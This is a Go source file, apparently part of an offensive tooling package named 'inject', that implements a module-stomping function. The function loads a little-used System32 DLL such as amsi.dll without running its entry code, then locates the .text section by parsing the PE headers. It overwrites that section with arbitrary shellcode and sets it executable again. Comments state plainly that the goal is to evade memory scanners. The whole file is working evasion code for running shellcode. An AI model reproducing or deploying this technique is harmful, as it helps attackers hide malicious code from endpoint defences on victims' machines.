//go:build windows

package inject

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// dontResolveDLLReferences loads a DLL as an image (proper section layout)
// but skips DllMain execution. Unlike LOAD_LIBRARY_AS_DATAFILE, the module
// is mapped as an image section, so memory scanners see a file-backed region.
const dontResolveDLLReferences = 0x01

// ModuleStomp loads a legitimate DLL, overwrites its .text section with
// shellcode, and returns the address. The shellcode executes from a
// file-backed image section, defeating memory scanners that trust
// image-backed regions.
//
// dllName should be a DLL in System32 that is not commonly loaded
// (e.g., "amsi.dll", "dbghelp.dll", "msftedit.dll").
func ModuleStomp(dllName string, shellcode []byte) (uintptr, error) {
	if len(shellcode) == 0 {
		return 0, fmt.Errorf("shellcode is empty")
	}

	// 1. Load the DLL as an image without executing DllMain.
	hModule, err := windows.LoadLibraryEx(dllName, 0, dontResolveDLLReferences)
	if err != nil {
		return 0, fmt.Errorf("failed to load module: %w", err)
	}

	base := uintptr(hModule)

	// 2. Parse PE headers at the module base to locate .text section.
	//    MZ signature at base, e_lfanew at base+0x3C.
	if *(*byte)(unsafe.Pointer(base)) != 'M' || *(*byte)(unsafe.Pointer(base + 1)) != 'Z' {
		return 0, fmt.Errorf("module has invalid MZ signature")
	}

	eLfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
	peOffset := base + uintptr(eLfanew)

	// Verify PE signature "PE\0\0".
	peSig := *(*uint32)(unsafe.Pointer(peOffset))
	if peSig != 0x00004550 {
		return 0, fmt.Errorf("module has invalid PE signature")
	}

	coffHeader := peOffset + 4
	numSections := *(*uint16)(unsafe.Pointer(coffHeader + 2))
	sizeOfOptHdr := *(*uint16)(unsafe.Pointer(coffHeader + 16))
	sectionTable := coffHeader + 20 + uintptr(sizeOfOptHdr)

	// 3. Walk section headers to find .text.
	var textAddr uintptr
	var textSize uint32
	found := false

	for i := uint16(0); i < numSections; i++ {
		secHdr := sectionTable + uintptr(i)*40
		var name [8]byte
		for j := 0; j < 8; j++ {
			name[j] = *(*byte)(unsafe.Pointer(secHdr + uintptr(j)))
		}

		nameStr := string(name[:])
		// Trim at first null byte.
		for k := 0; k < 8; k++ {
			if nameStr[k] == 0 {
				nameStr = nameStr[:k]
				break
			}
		}

		if nameStr == ".text" {
			// VirtualSize is at section header offset +8.
			textSize = *(*uint32)(unsafe.Pointer(secHdr + 8))
			// VirtualAddress is at section header offset +12.
			textVA := *(*uint32)(unsafe.Pointer(secHdr + 12))
			textAddr = base + uintptr(textVA)
			found = true
			break
		}
	}

	if !found {
		return 0, fmt.Errorf(".text section not found in target module")
	}

	// 4. Verify shellcode fits.
	if uint32(len(shellcode)) > textSize {
		return 0, fmt.Errorf("shellcode (%d bytes) exceeds .text section (%d bytes)",
			len(shellcode), textSize)
	}

	// 5. Make .text writable.
	var oldProtect uint32
	err = windows.VirtualProtect(textAddr, uintptr(textSize), windows.PAGE_READWRITE, &oldProtect)
	if err != nil {
		return 0, fmt.Errorf("VirtualProtect RW: %w", err)
	}

	// 6. Overwrite .text with shellcode.
	dst := unsafe.Slice((*byte)(unsafe.Pointer(textAddr)), textSize)
	// Zero the section first to avoid leaving stale code after the shellcode.
	for i := range dst {
		dst[i] = 0
	}
	copy(dst, shellcode)

	// 7. Restore execute-read permissions.
	err = windows.VirtualProtect(textAddr, uintptr(textSize), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		return 0, fmt.Errorf("VirtualProtect RX: %w", err)
	}

	return textAddr, nil
}
